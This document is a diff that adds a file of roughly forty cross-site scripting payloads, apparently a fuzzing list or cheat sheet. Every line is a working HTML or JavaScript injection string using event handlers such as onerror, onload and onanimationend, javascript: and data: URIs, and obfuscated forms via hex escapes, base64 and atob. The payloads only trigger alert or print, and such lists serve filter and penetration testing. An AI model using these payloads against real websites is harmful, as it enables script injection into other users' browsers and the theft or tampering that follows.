@@ -1,0 +1,38 @@
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
+<body onbeforeprint=console.log(1)>
+<xss onbeforescriptexecute=alert(1)><script>1</script>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<audio oncanplay=alert(1)><source src="audio.wav" type="audio/wav"></audio>
+<video controls><source src=video.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE 1 00:00:00.000 --> 00:00:05.000 <b>XSS</b> "></video>
+<audio src/onerror=alert(1)>
+<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>
+<a id=x tabindex=1 onfocus=alert(1)></a>
+<body onhashchange="print()">
+<body onload=alert(1)>
+<audio onloadeddata=alert(1)><source src="audio.wav" type="audio/wav"></audio>
+<image src=image.png onloadend=alert(1)>
+<body onmessage=print()>
+<audio autoplay onplay=alert(1)><source src="audio.wav" type="audio/wav"></audio>
+<body onresize="print()">
+<details ontoggle=alert(1) open>test</details>
+<style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=print()></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss>
+<input onauxclick=alert(1)>
+<a onbeforecut="alert(1)" contenteditable>test</a>
+<xss onclick="alert(1)" style=display:block>test</xss>
+<xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss>
+<xss draggable="true" ondrag="alert(1)" style=display:block>test</xss>
+<form onsubmit=alert(1)><input type=submit>
+<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>
+<script>onerror=alert;throw 1</script>
+<script>var{a:onerror}={a:alert};throw 1</script>
+<iframe src="javascript:alert(1)">
+<a href="javas cript:alert(1)">XSS</a>
+<script src="data:text/javascript,alert(1)"></script>
+<form><button formaction=javascript:alert(1)>XSS
+<iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>
+<script>eval('\x61lert(1)')</script>
+<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>
+<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>
